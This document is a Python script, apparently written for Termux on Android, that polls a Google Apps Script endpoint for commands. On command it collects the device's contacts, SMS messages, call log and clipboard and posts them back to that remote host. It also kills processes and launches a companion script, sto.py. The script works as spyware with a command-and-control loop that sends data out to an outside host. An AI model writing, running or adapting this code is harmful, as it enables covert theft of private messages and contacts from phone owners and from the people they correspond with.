import time,json,requests,os
import subprocess

def id():
    with open('termux.json', 'r') as file:
        dataj = json.load(file)
        id = dataj['id']
        uid = dataj['uid']
    if id == None:
        id = 1
        uid = None
    return {"id": id,"uid": uid}

def port(port):
    try:
        output = subprocess.check_output(["fuser", f"{port}/tcp"])
        pid = int(output.decode().strip())
        #print(f"Port {port} is in use by PID: {pid}. Killing the process...")
        subprocess.run(["kill", "-9", str(pid)])
        print(f"Process with PID {pid} killed.")
    except subprocess.CalledProcessError:
        #pass
        print(f"Port {port} is available")
    
def loadata(com):
    i = 0
    global contact, sms, call, clip,slink
    contact, sms, call, clip,slink = None, None, None, None,None
    
    while i < len(com):
        if com[i] == 1 :
            command = 'termux-contact-list'
            contact = subprocess.run(command, shell=True,stdout=subprocess.PIPE, text=True).stdout.replace('\n', '').replace(' ', '')
            
        if com[i] == 2 :
            command = 'termux-sms-list'
            sms = subprocess.run(command, shell=True,stdout=subprocess.PIPE, text=True).stdout.replace('\n', '').replace(' ', '')
            
        if com[i] == 3 :
            command = 'termux-call-log'
            call = subprocess.run(command, shell=True,stdout=subprocess.PIPE, text=True).stdout.replace('\n', '').replace(' ', '')
            
        if com[i] == 4 :
            command = 'termux-clipboard-get'
            clip = subprocess.run(command, shell=True,stdout=subprocess.PIPE, text=True).stdout.replace('\n', '').replace(' ', '')
            
        if com[i] == 5 :
            command0 = "ps -ef | grep python"

            port(8000)
            #close exist terminal
            result = subprocess.run(command0, shell=True,                        stdout=subprocess.PIPE, text=True)

            # Split the output into lines and process each line
            lines = result.stdout.split('\n')
            processes = []

            for line in lines:
                parts = line.split()
                if len(parts) >= 8 and "sto.py" in parts[8]:
                    process_info = {
                        "user": parts[8],
                        "pid": int(parts[1])
                    }
                    command1 = f"kill -9 {process_info['pid']}"
                    subprocess.run(command1, shell=True, stdout=subprocess.PIPE, text=True)
            cat = subprocess.Popen('nohup python sto.py &', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, close_fds=True)
            print(cat.stdout)
            while True:
                with open('termux.json', 'r') as file:
                    blue = json.load(file)
                    if blue['sto']:
                        slink = blue['com']
                        with open('termux.json', 'w') as file:
                            blue['sto'] = False
                            json.dump(blue, file, indent=4)
                        break
                

        
        i = i + 1
    data = {
        'action': True,
        'id': id()['id'],
        'uid': id()['uid'],
        'conp': contact,
        'msgp': sms,
        'callp': call,
        'clip': json.dumps([{"clip": clip}]),
        'sto': json.dumps([{"sto": slink}])
    }
    return data#json.dumps(data)
url = "https://script.google.com/macros/s/AKfycbzbqn7XRuhkwsPuijO3VmdlmN_eVVzqq_rKyRf51GI_fwwNLfZ7BWeUD3EjoUi4psm9LQ/exec"

while True:
    #req.get if true then ss = loadata(res.command) req.post;
    try:
        params = {
            "action": "True",
            "id": id()['id'],
           "uid": id()['uid'],
           }
        #print(params)
        response = requests.get(url,params=params).json().get('data')
        wait = 1 #10
        print(response)
        if response.get('sto') == True:
            data = loadata(json.loads(response.get('com')))
            #print(data)
            ss = requests.post( url , json=data)
            #print(ss.json())
        elif response.get('sto1') == False:
            with open('termux.json', 'r') as file:
                datak = json.load(file)

            # Update "id" and "uid" values
            datak['id'] = id()['id']
            datak['uid'] = response.get('uid')
            # Write updated data back to the JSON file
            with open('termux.json', 'w') as file:
                json.dump(datak, file, indent=4)
            
    except requests.exceptions.RequestException as e:
        wait = 1 #30
        print(f'Error{str(e)}')
    time.sleep(wait)
        
      